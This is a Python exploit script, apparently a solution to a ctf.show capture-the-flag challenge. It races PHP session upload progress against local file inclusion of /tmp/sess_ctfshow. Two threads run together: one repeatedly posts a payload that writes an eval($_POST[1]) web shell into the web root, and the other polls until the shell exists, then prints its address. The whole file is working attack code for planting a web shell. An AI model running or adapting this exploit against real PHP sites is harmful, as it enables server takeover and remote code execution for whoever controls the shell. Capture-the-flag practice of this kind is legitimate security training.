import requests
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.session()
sess = 'ctfshow'
url = "https://5b6f961c-0573-4d4a-b9af-d07a3a874fb8.challenge.ctf.show/"

data1 = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php echo "success";file_put_contents("/var/www/html/1.php","<?php eval(\\$_POST[1]);?>");?>'
}
file = {
    'file': 'ctfshow'
}
cookies = {
    'PHPSESSID': sess
}


def write():
    while True:
        r = session.post(url, data=data1, files=file, cookies=cookies,verify=False)


def read():
    while True:
        r = session.get(url + "?path=/tmp/sess_ctfshow", cookies=cookies,verify=False)
        if 'success' in r.text:
            print("shell 地址为：" + url + "1.php")
            exit()


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()
